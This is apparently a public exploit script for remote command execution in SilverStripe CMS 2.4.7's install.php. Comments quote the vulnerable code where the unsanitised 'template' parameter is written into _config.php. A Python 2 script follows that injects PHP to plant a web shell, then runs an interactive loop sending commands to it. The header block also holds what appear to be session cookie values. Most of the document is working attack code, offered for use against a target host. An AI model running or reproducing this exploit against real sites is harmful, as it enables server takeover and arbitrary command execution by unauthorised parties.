# Exploit Title: SilverStripe CMS 2.4.7 (install.php) Remote Command Execution Exploit
# Date: 26 Nisan 2012
# Author: Mehmet INCE
# Twitter: https://twitter.com/#!/mmetince
# Company: Bilgi Güvenliği Akademisi ( www.bga.com.tr )
# Software Link: http://www.silverstripe.org/assets/downloads/SilverStripe-v2.4.7.tar.gz
# Version: 2.4.7
# Tested on: v2.4.7 with Ubuntu 11.10
# CVE : Could someone can help me about that.
##############################
# First look at install.php on 978 - 993 lines.
#
#   if(file_exists(&#039;mysite/_config.php&#039;)) {
#       // Truncate the contents of _config instead of deleting it - we can&#039;t re-create it because Windows handles permissions slightly
#       // differently to UNIX based filesystems - it takes the permissions from the parent directory instead of retaining them
#       $fh = fopen(&#039;mysite/_config.php&#039;, &#039;wb&#039;);
#       fclose($fh);
#   }
#   $theme = isset($_POST[&#039;template&#039;]) ? $_POST[&#039;template&#039;] : &#039;blackcandy&#039;;
#   $locale = isset($_POST[&#039;locale&#039;]) ? $_POST[&#039;locale&#039;] : &#039;en_US&#039;;
#   $type = $config[&#039;db&#039;][&#039;type&#039;];
#   $dbConfig = $config[&#039;db&#039;][$type];
#   if(!$dbConfig) {
#       print_r($config);
#       die();
#   }
#
# Getting data from user with $_POST[&#039;template&#039;] that variable. After that goo 1000. line check that.
#  
#   $this->writeToFile("mysite/_config.php", <<<PHP
#
#  There is starting of write _config.php file. and our $_POST[&#039;template&#039;] used to write thata without sanitized.
#  So we can put whatever we want to _config.php file. A few little trick i exploit that vulnerabilities
#  with that python codes.
#
#  Have a nice days.
#  Gecmis 23 Nisanimiz kutlu olsun.
#!/usr/bin/env python
# -*- coding:utf-8 -*-
import httplib, urllib, urllib2,sys, getopt
 
def Menu():
    print "\n\n-------------------------------------------------------"
    print "-Kullanim Klavuzu [ USAGE ]               "
    print "-------------------------------------------------------"
    print "- Temel Kullanim - I [ Default Usage ] :                  "
    print "-        python exo.py www.target.com /            \n"
    print "- Temel Kullanim - II [ Default Usage ] :                 "
    print "-        python exo.py www.target.com /path/          \n"
if (len(sys.argv) <= 2) or (len(sys.argv) > 3):
    Menu()
    exit(1)
host = sys.argv[1]
path = sys.argv[2]
 
print " [+] Exploit ediliyor..!"
payload="blackcandy&#039;);fwrite(fopen("
payload+=&#039;"../shellcik.php","w"), &#039;
payload+="&#039;<?php $gelen"
payload+=&#039;=@$_GET["gelen"]; echo shell_exec($gelen);?>&#039;
parametreler = urllib.urlencode({&#039;db[type]&#039;:&#039;MySQLDatabase&#039;,
&#039;db[MySQLDatabase][server]&#039;:&#039;localhost&#039;,
&#039;db[MySQLDatabase][username]&#039;:&#039;root&#039;,
&#039;db[MySQLDatabase][password]&#039;:&#039;qwe123&#039;,
&#039;db[MySQLDatabase][database]&#039;:&#039;SS_mysite&#039;,
&#039;db[MSSQLDatabase][server]&#039;:&#039;localhost&#039;,
&#039;db[MSSQLDatabase][username]&#039;:&#039;root&#039;,
&#039;db[MSSQLDatabase][password]&#039;:&#039;qwe123&#039;,
&#039;db[MSSQLDatabase][database]&#039;:&#039;SS_mysite&#039;,
&#039;db[PostgreSQLDatabase][server]&#039;:&#039;localhost&#039;,
&#039;db[PostgreSQLDatabase][username]&#039;:&#039;root&#039;,
&#039;db[PostgreSQLDatabase][password]&#039;:&#039;qwe123&#039;,
&#039;db[PostgreSQLDatabase][database]&#039;:&#039;SS_mysite&#039;,
&#039;db[SQLiteDatabase][path]&#039;:&#039;/var/www/SilverStripe/assets/.db&#039;,
&#039;db[SQLiteDatabase][database]&#039;:&#039;SS_mysite&#039;,
&#039;admin[username]&#039;:&#039;admin&#039;,
&#039;admin[password]&#039;:&#039;qwe123&#039;,
&#039;locale&#039;:&#039;en_US&#039;,
&#039;template&#039;:payload,
&#039;stats&#039;:&#039;on&#039;,
&#039;go&#039;:&#039;Installing SilverStripe...&#039;})
print " [+]Parametreler olusturuldu [ Params Generated For Http Request ]"
basliklar = {"Content-type": "application/x-www-form-urlencoded",
             "Accept": "text/plain",
             "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language":"en-us,en;q=0.5",
             "Accept-Encoding":"gzip, deflate",
             "Connection":"keep-alive",
             "Referer":"http://" + host + path+"install.php",
             "Cookie":"alc_enc=1%3Aa9dbf14198a8f6bd9dd2d2c3e41e7164fb206d76; PastMember=1; PHPSESSID=0d7k4e661jd96i0u64vij68am3; phpbb3_srzvs_k=; phpbb3_srzvs_u=2; phpbb3_srzvs_sid=ede0a17fc1f375d6a633f291119c92d7; style_cookie=null; PHPSESSID=j7nr6uro3jc5tulodfeoum3u90; fws_cust=mince%232%23d41d8cd98f00b204e9800998ecf8427e"
}
print " [+]Basliklar olusturuldu [ Headers Generated For Http Request ]"
conn = httplib.HTTPConnection("localhost:80")
conn.request("POST",str(path) +"install.php",parametreler,basliklar)
responce = conn.getresponse()
if responce.status != 200:
    print "[+]Http Hatası : " + responce.status + "\n"
    print "Cant Exploit!:("
if responce.status == 200:
    komut=""
    while( komut != "exit" ):
        komut = urllib.quote_plus(str(raw_input("Shell :) => ")))
        print urllib2.urlopen("http://" + host + path+"shellcik.php?gelen="+komut).read()



